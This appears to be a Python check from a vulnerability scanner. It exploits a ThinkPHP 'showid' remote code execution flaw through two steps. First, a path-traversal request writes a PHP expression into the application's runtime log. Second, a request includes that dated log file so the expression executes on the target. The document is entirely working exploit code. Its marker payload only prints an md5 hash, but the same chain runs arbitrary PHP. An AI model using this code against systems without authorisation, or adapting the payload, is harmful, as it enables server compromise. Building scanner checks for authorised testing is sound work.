import urllib
import datetime
import requests


def verify(url):
    relsult = {
        'name': 'thinkphp_index_showid_rce',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        vurl2 = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
        req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req2.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = vurl
            relsult['payload'] = vurl2
        return relsult
    except:
        return relsult
